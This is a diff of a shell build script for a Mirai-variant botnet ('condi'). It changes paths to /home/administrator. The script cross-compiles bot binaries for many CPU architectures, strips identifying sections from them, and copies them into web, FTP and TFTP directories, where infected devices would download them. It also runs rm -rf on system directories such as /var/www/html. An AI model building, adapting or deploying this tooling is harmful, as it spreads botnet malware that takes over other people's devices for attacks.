@@ -17,24 +17,24 @@ export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GO
 
 # Compile Setting
 function compile_bot {
-    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    "$1-gcc" -std=c99 $3 /home/administrator/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
     "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
 }
 
 function compile_bot_arm7 {
-    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
+    "$1-gcc" -std=c99 $3 /home/administrator/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -lpthread -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
 }
 
-rm -rf ~/release
-rm -rf /var/www/html
-rm -rf /var/lib/tftpboot
-rm -rf /var/ftp
+rm -rf /home/administrator/release
+rm -rf /home/administrator/var/www/html
+rm -rf /home/administrator/var/lib/tftpboot
+rm -rf /home/administrator/var/ftp
 
-mkdir ~/release
-mkdir /var/ftp
-mkdir /var/lib/tftpboot
-mkdir /var/www/html
-mkdir /var/www/html/condi
+mkdir /home/administrator/release
+mkdir /home/administrator/var/ftp
+mkdir /home/administrator/var/lib/tftpboot
+mkdir /home/administrator/var/www/html
+mkdir /home/administrator/var/www/html/condi
 
 echo "Building - debug"
 compile_bot i586 debug.dbg "-static -DDEBUG"
@@ -63,10 +63,10 @@ compile_bot sh4 bot.sh4 "-static"
 echo "Building - sparc"
 compile_bot sparc bot.spc "-static"
 
-cp index.html /var/www/html
-cp release/bot.* /var/www/html
-cp release/bot.* /var/ftp
-cp release/bot.* /var/lib/tftpboot
+cp /home/administrator/index.html /var/www/html
+cp /home/administrator/release/bot.* /var/www/html
+cp /home/administrator/release/bot.* /var/ftp
+cp /home/administrator/release/bot.* /var/lib/tftpboot
 
-rm -rf bot/ build.sh index.php
+rm -rf /home/administrator/bot/ build.sh index.php
 echo "D o n e"
